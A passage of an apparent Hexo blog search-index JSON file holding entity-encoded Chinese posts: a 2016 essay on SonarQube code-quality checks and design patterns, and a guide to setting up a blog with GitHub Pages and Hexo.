}}","raw":null,"content":null,"categories":[{"name":"WEB后端","slug":"WEB后端","permalink":"http://www.wangxin123.com/categories/WEB后端/"}],"tags":[{"name":"疑难杂症","slug":"疑难杂症","permalink":"http://www.wangxin123.com/tags/疑难杂症/"},{"name":"初始化块","slug":"初始化块","permalink":"http://www.wangxin123.com/tags/初始化块/"}]},{"title":"从SonarQube谈设计模式","slug":"从SonarQube谈设计模式","date":"2016-06-05T13:42:13.000Z","updated":"2017-02-16T01:55:04.673Z","comments":true,"path":"2016/06/05/从SonarQube谈设计模式/","link":"","permalink":"http://www.wangxin123.com/2016/06/05/从SonarQube谈设计模式/","excerpt":"SonarQubeSonarQube&#x662F;&#x7528;&#x6765;&#x68C0;&#x6D4B;&#x4EE3;&#x7801;&#x8D28;&#x91CF;&#x7684;&#xFF0C;&#x4F46;&#x7C7B;&#x4F3C;&#x5DE5;&#x5177;&#x7684;&#x63A8;&#x5E7F;&#x5E38;&#x5E38;&#x9047;&#x5230;&#x963B;&#x788D;&#x3002; &#x6210;&#x578B;&#x9879;&#x76EE;&#x6216;&#x50F5;&#x5C38;&#x9879;&#x76EE;&#x53EF;&#x4EE5;&#x7406;&#x89E3;&#xFF0C;&#x9879;&#x76EE;&#x4F18;&#x5316;&#x9700;&#x8981;&#x6295;&#x5165;&#x7684;&#x4EBA;&#x529B;&#x6210;&#x672C;&#x548C;&#x65F6;&#x95F4;&#x6210;&#x672C;&#x592A;&#x5927;&#xFF0C;&#x800C;&#x4E14;&#x6700;&#x4E3B;&#x8981;&#x7684;&#x662F;&#x65E0;&#x6CD5;&#x4FDD;&#x8BC1;&#x6539;&#x52A8;&#x8FC7;&#x7A0B;&#x4E2D;&#x4E0D;&#x5F15;&#x5165;&#x65B0;&#x7684;bug&#x3002;&#x90A3;&#x4E48;&#x5927;&#x5BB6;&#x4F1A;&#x60F3;&#xFF0C;&#x5728;&#x9879;&#x76EE;&#x7ACB;&#x9879;&#x521D;&#x671F;&#x914D;&#x5408;&#x4F7F;&#x7528;&#xFF0C;&#x8FD9;&#x5E94;&#x8BE5;&#x6CA1;&#x4EC0;&#x4E48;&#x95EE;&#x9898;&#x4E86;&#x5427;&#xFF1F;&#x5948;&#x4F55;&#x7406;&#x7531;&#x8FD9;&#x4E1C;&#x897F;&#xFF0C;&#x53EA;&#x8981;&#x60F3;&#x627E;&#xFF0C;&#x603B;&#x662F;&#x6709;&#x7684;&#x3002;&#x6BD5;&#x7ADF;&#x5927;&#x5BB6;&#x90FD;&#x559C;&#x6B22;&#x5F85;&#x5728;&#x8212;&#x9002;&#x533A;&#xFF0C;&#x4E0D;&#x559C;&#x6B22;&#x6298;&#x817E;&#x3002;&#x8BD5;&#x60F3;&#x521A;&#x63D0;&#x4EA4;&#x5B8C;&#x4EE3;&#x7801;&#x6CA1;&#x591A;&#x4E45;&#xFF0C;&#x90AE;&#x4EF6;&#x5C31;&#x63D0;&#x9192;&#x4F60;&#x9700;&#x8981;&#x4F18;&#x5316;&#xFF0C;&#x6253;&#x5F00;&#x4E00;&#x770B;&#xFF0C;&#x539F;&#x6765;&#x53C8;&#x662F;for&#x5FAA;&#x73AF;&#x592A;&#x591A;&#x3001;&#x5D4C;&#x5957;&#x592A;&#x591A;&#x3001;&#x91CD;&#x590D;&#x4EE3;&#x7801;&#x592A;&#x591A;&#x6216;&#x8005;&#x65B9;&#x6CD5;&#x884C;&#x6570;&#x592A;&#x591A;&#x3002;why&#xFF1F;&#x6211;&#x5B9E;&#x73B0;&#x529F;&#x80FD;&#x4E0D;&#x5C31;&#x884C;&#x4E86;&#x5417;&#xFF1F;&#x65F6;&#x95F4;&#x8FD9;&#x4E48;&#x7D27;&#x8FEB;&#xFF0C;&#x600E;&#x4E48;&#x6709;&#x65F6;&#x95F4;&#x4FEE;&#x6539;&#x8FD9;&#x79CD;&#x95EE;&#x9898;&#x5462;&#xFF1F;&#x8FDE;&#x8FD9;&#x4E9B;&#x5C0F;&#x95EE;&#x9898;&#x90FD;&#x6293;&#x4F4F;&#x4E0D;&#x653E;&#xFF1F;&#x5475;&#x5475;&#xFF0C;&#x4EE5;&#x540E;&#x6709;&#x65F6;&#x95F4;&#x4E00;&#x5B9A;&#x6539;&#x3002; &#x6211;&#x8D77;&#x521D;&#x4E5F;&#x8FD9;&#x4E48;&#x60F3;&#x7684;&#xFF0C;&#x867D;&#x7136;&#x77E5;&#x9053;&#x597D;&#x7684;&#x4E60;&#x60EF;&#x517B;&#x6210;&#x5F88;&#x91CD;&#x8981;&#xFF0C;&#x4F46;&#x8FD8;&#x662F;&#x907F;&#x514D;&#x4E0D;&#x4E86;&#x6709;&#x6240;&#x62B5;&#x89E6;&#x3002;&#x4E0D;&#x8FC7;&#x597D;&#x5728;&#x4E0A;&#x5934;&#x89C4;&#x5B9A;&#x76F8;&#x5173;&#x7C7B;&#x578B;bug&#x5FC5;&#x987B;&#x6E05;&#x96F6;&#xFF0C;&#x575A;&#x6301;&#x7684;&#x65F6;&#x95F4;&#x4E00;&#x957F;&#xFF0C;&#x6536;&#x83B7;&#x8FD8;&#x662F;&#x86EE;&#x5927;&#xFF0C;&#x6700;&#x76F4;&#x63A5;&#x7684;&#x4F53;&#x73B0;&#x5C31;&#x662F;&#x4EE3;&#x7801;&#x6613;&#x8BFB;&#x6027;&#x52A0;&#x5F3A;&#x4E86;&#x3002;&#x8FD9;&#x4E2A;&#x65F6;&#x5019;&#x6211;&#x7A81;&#x7136;&#x5C31;&#x60F3;&#x8D77;&#x4E86;&#x8BBE;&#x8BA1;&#x6A21;&#x5F0F;&#x3002; &#x8BBE;&#x8BA1;&#x6A21;&#x5F0F;&#x81EA;&#x5927;&#x4E8C;&#x63A5;&#x89E6;Java&#x4EE5;&#x6765;&#xFF0C;&#x5C31;&#x77E5;&#x9053;IT&#x754C;&#x6709;&#x4E00;&#x79CD;&#x65E0;&#x4E0A;&#x529F;&#x6CD5;&#x53EB;&#x8BBE;&#x8BA1;&#x6A21;&#x5F0F;&#xFF0C;&#x7136;&#x540E;&#x5C31;&#x4E00;&#x76F4;&#x60F3;&#x7740;&#x54EA;&#x5929;&#x80FD;&#x878D;&#x4F1A;&#x8D2F;&#x901A;&#xFF0C;&#x6325;&#x624B;&#x95F4;&#xFF0C;&#x5C31;&#x662F;&#x4E00;&#x7247;&#x9526;&#x7EE3;&#x4EE3;&#x7801;&#x3002;","keywords":null,"text":"SonarQubeSonarQube&#x662F;&#x7528;&#x6765;&#x68C0;&#x6D4B;&#x4EE3;&#x7801;&#x8D28;&#x91CF;&#x7684;&#xFF0C;&#x4F46;&#x7C7B;&#x4F3C;&#x5DE5;&#x5177;&#x7684;&#x63A8;&#x5E7F;&#x5E38;&#x5E38;&#x9047;&#x5230;&#x963B;&#x788D;&#x3002; &#x6210;&#x578B;&#x9879;&#x76EE;&#x6216;&#x50F5;&#x5C38;&#x9879;&#x76EE;&#x53EF;&#x4EE5;&#x7406;&#x89E3;&#xFF0C;&#x9879;&#x76EE;&#x4F18;&#x5316;&#x9700;&#x8981;&#x6295;&#x5165;&#x7684;&#x4EBA;&#x529B;&#x6210;&#x672C;&#x548C;&#x65F6;&#x95F4;&#x6210;&#x672C;&#x592A;&#x5927;&#xFF0C;&#x800C;&#x4E14;&#x6700;&#x4E3B;&#x8981;&#x7684;&#x662F;&#x65E0;&#x6CD5;&#x4FDD;&#x8BC1;&#x6539;&#x52A8;&#x8FC7;&#x7A0B;&#x4E2D;&#x4E0D;&#x5F15;&#x5165;&#x65B0;&#x7684;bug&#x3002;&#x90A3;&#x4E48;&#x5927;&#x5BB6;&#x4F1A;&#x60F3;&#xFF0C;&#x5728;&#x9879;&#x76EE;&#x7ACB;&#x9879;&#x521D;&#x671F;&#x914D;&#x5408;&#x4F7F;&#x7528;&#xFF0C;&#x8FD9;&#x5E94;&#x8BE5;&#x6CA1;&#x4EC0;&#x4E48;&#x95EE;&#x9898;&#x4E86;&#x5427;&#xFF1F;&#x5948;&#x4F55;&#x7406;&#x7531;&#x8FD9;&#x4E1C;&#x897F;&#xFF0C;&#x53EA;&#x8981;&#x60F3;&#x627E;&#xFF0C;&#x603B;&#x662F;&#x6709;&#x7684;&#x3002;&#x6BD5;&#x7ADF;&#x5927;&#x5BB6;&#x90FD;&#x559C;&#x6B22;&#x5F85;&#x5728;&#x8212;&#x9002;&#x533A;&#xFF0C;&#x4E0D;&#x559C;&#x6B22;&#x6298;&#x817E;&#x3002;&#x8BD5;&#x60F3;&#x521A;&#x63D0;&#x4EA4;&#x5B8C;&#x4EE3;&#x7801;&#x6CA1;&#x591A;&#x4E45;&#xFF0C;&#x90AE;&#x4EF6;&#x5C31;&#x63D0;&#x9192;&#x4F60;&#x9700;&#x8981;&#x4F18;&#x5316;&#xFF0C;&#x6253;&#x5F00;&#x4E00;&#x770B;&#xFF0C;&#x539F;&#x6765;&#x53C8;&#x662F;for&#x5FAA;&#x73AF;&#x592A;&#x591A;&#x3001;&#x5D4C;&#x5957;&#x592A;&#x591A;&#x3001;&#x91CD;&#x590D;&#x4EE3;&#x7801;&#x592A;&#x591A;&#x6216;&#x8005;&#x65B9;&#x6CD5;&#x884C;&#x6570;&#x592A;&#x591A;&#x3002;why&#xFF1F;&#x6211;&#x5B9E;&#x73B0;&#x529F;&#x80FD;&#x4E0D;&#x5C31;&#x884C;&#x4E86;&#x5417;&#xFF1F;&#x65F6;&#x95F4;&#x8FD9;&#x4E48;&#x7D27;&#x8FEB;&#xFF0C;&#x600E;&#x4E48;&#x6709;&#x65F6;&#x95F4;&#x4FEE;&#x6539;&#x8FD9;&#x79CD;&#x95EE;&#x9898;&#x5462;&#xFF1F;&#x8FDE;&#x8FD9;&#x4E9B;&#x5C0F;&#x95EE;&#x9898;&#x90FD;&#x6293;&#x4F4F;&#x4E0D;&#x653E;&#xFF1F;&#x5475;&#x5475;&#xFF0C;&#x4EE5;&#x540E;&#x6709;&#x65F6;&#x95F4;&#x4E00;&#x5B9A;&#x6539;&#x3002; &#x6211;&#x8D77;&#x521D;&#x4E5F;&#x8FD9;&#x4E48;&#x60F3;&#x7684;&#xFF0C;&#x867D;&#x7136;&#x77E5;&#x9053;&#x597D;&#x7684;&#x4E60;&#x60EF;&#x517B;&#x6210;&#x5F88;&#x91CD;&#x8981;&#xFF0C;&#x4F46;&#x8FD8;&#x662F;&#x907F;&#x514D;&#x4E0D;&#x4E86;&#x6709;&#x6240;&#x62B5;&#x89E6;&#x3002;&#x4E0D;&#x8FC7;&#x597D;&#x5728;&#x4E0A;&#x5934;&#x89C4;&#x5B9A;&#x76F8;&#x5173;&#x7C7B;&#x578B;bug&#x5FC5;&#x987B;&#x6E05;&#x96F6;&#xFF0C;&#x575A;&#x6301;&#x7684;&#x65F6;&#x95F4;&#x4E00;&#x957F;&#xFF0C;&#x6536;&#x83B7;&#x8FD8;&#x662F;&#x86EE;&#x5927;&#xFF0C;&#x6700;&#x76F4;&#x63A5;&#x7684;&#x4F53;&#x73B0;&#x5C31;&#x662F;&#x4EE3;&#x7801;&#x6613;&#x8BFB;&#x6027;&#x52A0;&#x5F3A;&#x4E86;&#x3002;&#x8FD9;&#x4E2A;&#x65F6;&#x5019;&#x6211;&#x7A81;&#x7136;&#x5C31;&#x60F3;&#x8D77;&#x4E86;&#x8BBE;&#x8BA1;&#x6A21;&#x5F0F;&#x3002; &#x8BBE;&#x8BA1;&#x6A21;&#x5F0F;&#x81EA;&#x5927;&#x4E8C;&#x63A5;&#x89E6;Java&#x4EE5;&#x6765;&#xFF0C;&#x5C31;&#x77E5;&#x9053;IT&#x754C;&#x6709;&#x4E00;&#x79CD;&#x65E0;&#x4E0A;&#x529F;&#x6CD5;&#x53EB;&#x8BBE;&#x8BA1;&#x6A21;&#x5F0F;&#xFF0C;&#x7136;&#x540E;&#x5C31;&#x4E00;&#x76F4;&#x60F3;&#x7740;&#x54EA;&#x5929;&#x80FD;&#x878D;&#x4F1A;&#x8D2F;&#x901A;&#xFF0C;&#x6325;&#x624B;&#x95F4;&#xFF0C;&#x5C31;&#x662F;&#x4E00;&#x7247;&#x9526;&#x7EE3;&#x4EE3;&#x7801;&#x3002;&#x53EF;&#x662F;&#x8FD9;&#x4E9B;&#x5E74;&#x8FC7;&#x53BB;&#xFF0C;&#x8BBE;&#x8BA1;&#x6A21;&#x5F0F;&#x7ED9;&#x6211;&#x7684;&#x611F;&#x89C9;&#x5C31;&#x662F;&#x9065;&#x4E0D;&#x53EF;&#x53CA;&#xFF0C;&#x4EFF;&#x4F5B;&#x5B83;&#x53EA;&#x5B58;&#x5728;&#x4E8E;&#x9762;&#x8BD5;&#x9898;&#x4E2D;&#xFF0C;&#x800C;&#x4E14;&#x5947;&#x602A;&#x7684;&#x662F;&#x5927;&#x5BB6;&#x95F2;&#x65F6;&#x8C08;&#x8BBA;&#x6280;&#x672F;&#x4E5F;&#x5F88;&#x5C11;&#x6D89;&#x53CA;&#xFF0C;why? &#x9996;&#x5148;&#x81EA;&#x6211;&#x53CD;&#x601D;&#xFF0C;&#x90A3;&#x662F;&#x81EA;&#x8EAB;&#x6C34;&#x5E73;&#x4E0D;&#x884C;&#xFF0C;get&#x4E0D;&#x5230;&#x6838;&#x5FC3;&#xFF0C;&#x4F46;&#x6211;&#x76F8;&#x4FE1;&#x8FD9;&#x4E0D;&#x662F;&#x5168;&#x90E8;&#x539F;&#x56E0;&#x3002; &#x6211;&#x8BA4;&#x4E3A;&#x8BBE;&#x8BA1;&#x6A21;&#x5F0F;&#x7684;&#x51FA;&#x73B0;&#x662F;&#x4E3A;&#x4E86;&#x66F4;&#x597D;&#x7684;&#x5199;&#x597D;&#x4EE3;&#x7801;&#xFF0C;&#x5B83;&#x53EA;&#x662F;&#x624B;&#x6BB5;&#xFF0C;&#x4E0D;&#x662F;&#x76EE;&#x7684;&#x3002;&#x5948;&#x4F55;&#x8FD9;&#x7CFB;&#x5217;&#x624B;&#x6BB5;&#x592A;&#x9AD8;&#x660E;&#xFF0C;&#x5B8C;&#x5168;&#x4E0D;&#x662F;&#x521D;&#x7EA7;&#x83DC;&#x9E1F;&#x7684;&#x83DC;&#x3002;&#x521D;&#x7EA7;&#x83DC;&#x9E1F;&#x6CA1;&#x638C;&#x63E1;&#xFF0C;&#x90A3;&#x5927;&#x795E;&#x7EA7;&#x522B;&#x7684;&#x5E73;&#x5E38;&#x4E3A;&#x4EC0;&#x4E48;&#x4E5F;&#x4E0D;&#x600E;&#x4E48;&#x8C08;&#x8BBA;&#x8BBE;&#x8BA1;&#x6A21;&#x5F0F;&#x5462;&#xFF1F;&#x6211;&#x60F3;&#xFF0C;&#x53EF;&#x80FD;&#x662F;&#x56E0;&#x4E3A;&#x4E0D;&#x540C;&#x5C42;&#x7EA7;&#x7684;&#x4EBA;&#xFF0C;&#x5982;&#x679C;&#x7528;&#x8BBE;&#x8BA1;&#x6A21;&#x5F0F;&#x91CC;&#x9762;&#x7684;&#x903C;&#x683C;&#x540D;&#x8BCD;&#x8C08;&#x8BBA;&#xFF0C;&#x6839;&#x672C;&#x5C31;&#x65E0;&#x6CD5;&#x6C9F;&#x901A;&#xFF0C;&#x56E0;&#x4E3A;&#x6211;&#x4EEC;&#x5E73;&#x5E38;&#x662F;&#x8FD9;&#x4E48;&#x8BA8;&#x8BBA;&#x7684;&#xFF1A; &#x8FD9;&#x4E2A;&#x7C7B;&#x8D1F;&#x8D23;&#x521B;&#x5EFA;&#x8FD9;&#x4E2A;&#x5BF9;&#x8C61;&#xFF0C;&#x5BF9;&#x3002;&#x7136;&#x540E;&#x8FD9;&#x8FB9;&#x5305;&#x88C5;&#x4E00;&#x4E0B;&#xFF0C;&#x5BF9;&#x7684;&#x3002; &#x55EF;&#xFF0C;&#x4F60;&#x8FD9;&#x4E2A;&#x7C7B;&#x5C31;&#x662F;&#x9488;&#x5BF9;&#x4ED6;&#x7684;Interface&#x505A;&#x7684;&#x4E00;&#x4E2A;Adapter&#xFF0C;&#x662F;&#x7684;&#x3002; &#x4F60;&#x8FD9;&#x4E2A;&#x53EA;&#x521B;&#x5EFA;&#x4E00;&#x6B21;&#xFF0C;&#x63D0;&#x9AD8;&#x6027;&#x80FD;&#x3002;&#x54E6;&#xFF0C;&#x5BF9;&#xFF0C;&#x6CA1;&#x9519;&#xFF0C;&#x4F46;&#x8FD9;&#x6837;&#x66F4;&#x597D;&#xFF0C;balabala&#x2026; &#x6240;&#x4EE5;&#x8BBE;&#x8BA1;&#x6A21;&#x5F0F;&#x5927;&#x90E8;&#x5206;&#x60C5;&#x51B5;&#x4E0B;&#x53EA;&#x662F;&#x7ED9;&#x5927;&#x5BB6;&#x63D0;&#x4F9B;&#x4E86;&#x4E00;&#x6761;&#x5FEB;&#x901F;&#x63D0;&#x5347;&#x903C;&#x683C;&#x7684;&#x9014;&#x5F84;&#xFF0C;&#x8981;&#x662F;&#x6CA1;&#x6709;&#x65F6;&#x95F4;&#x4E0A;&#x7684;&#x79EF;&#x7D2F;&#xFF0C;&#x5C31;&#x7B97;&#x628A;&#x6240;&#x6709;&#x8BBE;&#x8BA1;&#x6A21;&#x5F0F;&#x7684;&#x540D;&#x5B57;&#x90FD;&#x80CC;&#x4E0B;&#x6765;&#xFF0C;&#x53EF;&#x80FD;&#x8FD8;&#x662F;&#x4E0D;&#x592A;&#x4F1A;&#x7528; 0.0 SonarQube &amp; &#x8BBE;&#x8BA1;&#x6A21;&#x5F0F;&#x90A3;&#x4E48;&#x600E;&#x4E48;&#x624D;&#x80FD;&#x4F18;&#x96C5;&#x7684;&#x638C;&#x63E1;&#x8BBE;&#x8BA1;&#x6A21;&#x5F0F;&#x5450;&#xFF0C;&#x60F3;&#x6765;&#x60F3;&#x53BB;&#xFF0C;&#x6211;&#x7684;&#x65B9;&#x6CD5;&#x662F;&#x5148;&#x4E86;&#x89E3;&#x5B83;&#x7684;&#x5404;&#x79CD;&#x4F7F;&#x7528;&#xFF0C;&#x77E5;&#x9053;&#x5B83;&#x7684;&#x5B58;&#x5728;&#xFF0C;&#x7136;&#x540E;&#x5728;&#x5177;&#x4F53;&#x7684;&#x4F7F;&#x7528;&#x5C42;&#x9762;&#x4E0A;&#x53EA;&#x662F;&#x501F;&#x9274;&#x5B83;&#x3002;&#x5982;&#x679C;&#x4F60;&#x5BF9;&#x4EE3;&#x7801;&#x6709;&#x9AD8;&#x8981;&#x6C42;&#xFF0C;&#x5728;&#x4EFB;&#x4F55;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;&#x90FD;&#x4F1A;&#x52AA;&#x529B;&#x53BB;&#x63D0;&#x9AD8;&#x4EE3;&#x7801;&#x7684;&#x53EF;&#x8BFB;&#x6027;&#xFF0C;&#x90FD;&#x4F1A;&#x53BB;&#x63A7;&#x5236;&#x4F60;&#x7684;&#x4EE3;&#x7801;&#x91CF;&#x3001;&#x51CF;&#x5C11;&#x5D4C;&#x5957;&#x4E0E;&#x5FAA;&#x73AF;&#x3001;&#x51CF;&#x5C11;&#x5404;&#x79CD;&#x6F5C;&#x5728;&#x98CE;&#x9669;&#x65F6;&#xFF0C;&#x6211;&#x60F3;&#x65F6;&#x95F4;&#x957F;&#x4E86;&#xFF0C;&#x65E0;&#x5E08;&#x81EA;&#x901A;&#xFF0C;&#x81EA;&#x6709;&#x4E00;&#x756A;&#x98CE;&#x666F;&#x3002;","raw":null,"content":null,"categories":[{"name":"随笔","slug":"随笔","permalink":"http://www.wangxin123.com/categories/随笔/"}],"tags":[{"name":"SonarQube","slug":"SonarQube","permalink":"http://www.wangxin123.com/tags/SonarQube/"},{"name":"设计模式","slug":"设计模式","permalink":"http://www.wangxin123.com/tags/设计模式/"}]},{"title":"Github+Hexo,搭建专属网站","slug":"Github+Hexo,搭建专有博客","date":"2016-06-01T14:22:00.000Z","updated":"2017-02-21T08:40:51.485Z","comments":true,"path":"2016/06/01/Github+Hexo,搭建专有博客/","link":"","permalink":"http://www.wangxin123.com/2016/06/01/Github+Hexo,搭建专有博客/","excerpt":"&#x524D;&#x8A00;&#x8BB0;&#x5F97;&#x4ECE;&#x5927;&#x4E8C;&#x5F00;&#x59CB;&#xFF0C;&#x5C31;&#x4E00;&#x76F4;&#x60F3;&#x642D;&#x4E2A;&#x4E13;&#x5C5E;&#x7F51;&#x7AD9;&#xFF0C;&#x5F53;&#x65F6;&#x4F7F;&#x52B2;&#x62A0;&#x9875;&#x9762;&#x3010;&#x524D;&#x7AEF;&#x9875;&#x9762;&#x662F;&#x4ECE;QQ&#x7A7A;&#x95F4;&#x62A0;&#x7684;&#xFF0C;&#x73B0;&#x5728;&#x60F3;&#x62A0;&#x4F30;&#x8BA1;&#x6CA1;&#x8FD9;&#x4E48;&#x5BB9;&#x6613;&#x4E86;&#x3011;&#xFF0C;&#x5199;&#x4EE3;&#x7801;&#xFF0C;&#x5FD9;&#x6D3B;&#x534A;&#x5929;&#x624D;&#x628A;&#x7A0B;&#x5E8F;&#x5F04;&#x597D;&#x3002; &#x53EF;&#x60DC;&#x6700;&#x7EC8;&#x9879;&#x76EE;&#x8FD8;&#x662F;&#x6CA1;&#x4E0A;&#x7EBF;&#xFF0C;&#x56E0;&#x4E3A;&#x5F53;&#x65F6;&#x6709;&#x4E24;&#x95EE;&#x9898;&#x7ED5;&#x4E0D;&#x5F00; &#x9700;&#x8981;&#x8D2D;&#x4E70;&#x670D;&#x52A1;&#x5668;&#x3010;&#x670D;&#x52A1;&#x5668;&#x592A;&#x8D35;&#xFF0C;&#x73B0;&#x5728;&#x4FBF;&#x5B9C;&#x7684;&#x963F;&#x91CC;&#x4E91;&#x670D;&#x52A1;&#x5668;&#x6BCF;&#x6708;&#x90FD;&#x9700;100&#x5DE6;&#x53F3;&#x3011;&#x3002; &#x9700;&#x8981;&#x8FD0;&#x7EF4;&#x7BA1;&#x7406;&#x3010;&#x9EBB;&#x70E6;&#x4E14;&#x5371;&#x9669;&#xFF0C;&#x670D;&#x52A1;&#x5668;&#x5B95;&#x4E86;&#x53EF;&#x80FD;&#x4E22;&#x5931;&#x6570;&#x636E;&#x3011;&#x3002; &#x6700;&#x8FD1;&#x4E86;&#x89E3;&#x5230; github + hexo &#x80FD;&#x5B8C;&#x7F8E;&#x89E3;&#x51B3;&#x4E0A;&#x8FF0;&#x95EE;&#x9898;&#xFF0C;&#x5565;&#x4E5F;&#x4E0D;&#x8BF4;&#x4E86;&#xFF0C;&#x76F4;&#x63A5;&#x5F00;&#x5E72; ^.^ &#x76F8;&#x5173;&#x7F51;&#x7AD9;&#x642D;&#x5EFA;&#x6559;&#x7A0B;&#x7F51;&#x4E0A;&#x6BD4;&#x6BD4;&#x7686;&#x662F;&#xFF0C;&#x6B64;&#x5904;&#x4E0D;&#x7D2F;&#x8D58;&#xFF0C;&#x4E0B;&#x9762;&#x662F;&#x642D;&#x5EFA;&#x8FC7;&#x7A0B;&#x4E2D;&#x7528;&#x5230;&#x7684;&#x76F8;&#x5173;&#x7F51;&#x7AD9;&#xFF1A; hexo&#x4E2D;&#x6587;&#x7F51;&#x7AD9;&#xFF1A;https://hexo.io/zh-cn/docs/hexo&#x4E3B;&#x9898;&#x6A21;&#x677F;&#xFF1A;https://www.zhihu.com/question/24422335hexo+github&#x642D;&#x5EFA;&#x8FC7;&#x7A0B;&#xFF1A;http://www.jianshu.com/p/df3edc4286d2Markdown &#x8BED;&#x6CD5;&#x8BF4;&#x660E;&#xFF1A;http://www.appinn.com/markdown/github&#x7ED1;&#x5B9A;&#x57DF;&#x540D;&#xFF1A;http://www.jianshu.com/p/1d427e888dda HEXO&#x5982;&#x4F55;&#x4F18;&#x5316;&#x90E8;&#x7F72;&#x53CA;&#x7BA1;&#x7406;&#x95EE;&#x9898;&#xFF1A;&#x4F7F;&#x7528;hexo&#x65F6;&#xFF0C;&#x5982;&#x679C;&#x672C;&#x5730;&#x6587;&#x4EF6;&#x4E22;&#x5931;&#x6216;&#x8005;&#x60F3;&#x5728;&#x5176;&#x4ED6;&#x7535;&#x8111;&#x4E0A;&#x4FEE;&#x6539;&#x535A;&#x5BA2;&#x600E;&#x4E48;&#x529E;&#xFF1F;&#x65B9;&#x6848;&#xFF1A;&#x7B80;&#x5355;&#x5730;&#x8BF4;&#xFF0C;&#x6BCF;&#x4E2A;&#x60F3;&#x5EFA;&#x7ACB;GitHub Pages&#x7684;&#x4ED3;&#x5E93;&#xFF0C;&#x81F3;&#x5C11;&#x4E24;&#x4E2A;&#x5206;&#x652F;&#xFF0C;&#x4E00;&#x4E2A;hexo&#x5206;&#x652F;&#x7528;&#x6765;&#x5B58;&#x653E;&#x7F51;&#x7AD9;&#x7684;&#x539F;&#x59CB;&#x6587;&#x4EF6;&#xFF0C;&#x4E00;&#x4E2A;master&#x5206;&#x652F;&#x7528;&#x6765;&#x5B58;&#x653E;&#x751F;&#x6210;&#x7684;&#x9759;&#x6001;&#x7F51;&#x9875;&#x3002;","keywords":null,"text":"&#x524D;&#x8A00;&#x8BB0;&#x5F97;&#x4ECE;&#x5927;&#x4E8C;&#x5F00;&#x59CB;&#xFF0C;&#x5C31;&#x4E00;&#x76F4;&#x60F3;&#x642D;&#x4E2A;&#x4E13;&#x5C5E;&#x7F51;&#x7AD9;&#xFF0C;&#x5F53;&#x65F6;&#x4F7F;&#x52B2;&#x62A0;&#x9875;&#x9762;&#x3010;&#x524D;&#x7AEF;&#x9875;&#x9762;&#x662F;&#x4ECE;QQ&#x7A7A;&#x95F4;&#x62A0;&#x7684;&#xFF0C;&#x73B0;&#x5728;&#x60F3;&#x62A0;&#x4F30;&#x8BA1;&#x6CA1;&#x8FD9;&#x4E48;&#x5BB9;&#x6613;&#x4E86;&#x3011;&#xFF0C;&#x5199;&#x4EE3;&#x7801;&#xFF0C;&#x5FD9;&#x6D3B;&#x534A;&#x5929;&#x624D;&#x628A;&#x7A0B;&#x5E8F;&#x5F04;&#x597D;&#x3002; &#x53EF;&#x60DC;&#x6700;&#x7EC8;&#x9879;&#x76EE;&#x8FD8;&#x662F;&#x6CA1;&#x4E0A;&#x7EBF;&#xFF0C;&#x56E0;&#x4E3A;&#x5F53;&#x65F6;&#x6709;&#x4E24;&#x95EE;&#x9898;&#x7ED5;&#x4E0D;&#x5F00; &#x9700;&#x8981;&#x8D2D;&#x4E70;&#x670D;&#x52A1;&#x5668;&#x3010;&#x670D;&#x52A1;&#x5668;&#x592A;&#x8D35;&#xFF0C;&#x73B0;&#x5728;&#x4FBF;&#x5B9C;&#x7684;&#x963F;&#x91CC;&#x4E91;&#x670D;&#x52A1;&#x5668;&#x6BCF;&#x6708;&#x90FD;&#x9700;100&#x5DE6;&#x53F3;&#x3011;&#x3002; &#x9700;&#x8981;&#x8FD0;&#x7EF4;&#x7BA1;&#x7406;&#x3010;&#x9EBB;&#x70E6;&#x4E14;&#x5371;&#x9669;&#xFF0C;&#x670D;&#x52A1;&#x5668;&#x5B95;&#x4E86;&#x53EF;&#x80FD;&#x4E22;&#x5931;&#x6570;&#x636E;&#x3011;&#x3002; &#x6700;&#x8FD1;&#x4E86;&#x89E3;&#x5230; github + hexo &#x80FD;&#x5B8C;&#x7F8E;&#x89E3;&#x51B3;&#x4E0A;&#x8FF0;&#x95EE;&#x9898;&#xFF0C;&#x5565;&#x4E5F;&#x4E0D;&#x8BF4;&#x4E86;&#xFF0C;&#x76F4;&#x63A5;&#x5F00;&#x5E72; ^.^ &#x76F8;&#x5173;&#x7F51;&#x7AD9;&#x642D;&#x5EFA;&#x6559;&#x7A0B;&#x7F51;&#x4E0A;&#x6BD4;&#x6BD4;&#x7686;&#x662F;&#xFF0C;&#x6B64;&#x5904;&#x4E0D;&#x7D2F;&#x8D58;&#xFF0C;&#x4E0B;&#x9762;&#x662F;&#x642D;&#x5EFA;&#x8FC7;&#x7A0B;&#x4E2D;&#x7528;&#x5230;&#x7684;&#x76F8;&#x5173;&#x7F51;&#x7AD9;&#xFF1A; hexo&#x4E2D;&#x6587;&#x7F51;&#x7AD9;&#xFF1A;https://hexo.io/zh-cn/docs/hexo&#x4E3B;&#x9898;&#x6A21;&#x677F;&#xFF1A;https://www.zhihu.com/question/24422335hexo+github&#x642D;&#x5EFA;&#x8FC7;&#x7A0B;&#xFF1A;http://www.jianshu.com/p/df3edc4286d2Markdown &#x8BED;&#x6CD5;&#x8BF4;&#x660E;&#xFF1A;http://www.appinn.com/markdown/github&#x7ED1;&#x5B9A;&#x57DF;&#x540D;&#xFF1A;http://www.jianshu.com/p/1d427e888dda HEXO&#x5982;&#x4F55;&#x4F18;&#x5316;&#x90E8;&#x7F72;&#x53CA;&#x7BA1;&#x7406;&#x95EE;&#x9898;&#xFF1A;&#x4F7F;&#x7528;hexo&#x65F6;&#xFF0C;&#x5982;&#x679C;&#x672C;&#x5730;&#x6587;&#x4EF6;&#x4E22;&#x5931;&#x6216;&#x8005;&#x60F3;&#x5728;&#x5176;&#x4ED6;&#x7535;&#x8111;&#x4E0A;&#x4FEE;&#x6539;&#x535A;&#x5BA2;&#x600E;&#x4E48;&#x529E;&#xFF1F;&#x65B9;&#x6848;&#xFF1A;&#x7B80;&#x5355;&#x5730;&#x8BF4;&#xFF0C;&#x6BCF;&#x4E2A;&#x60F3;&#x5EFA;&#x7ACB;GitHub 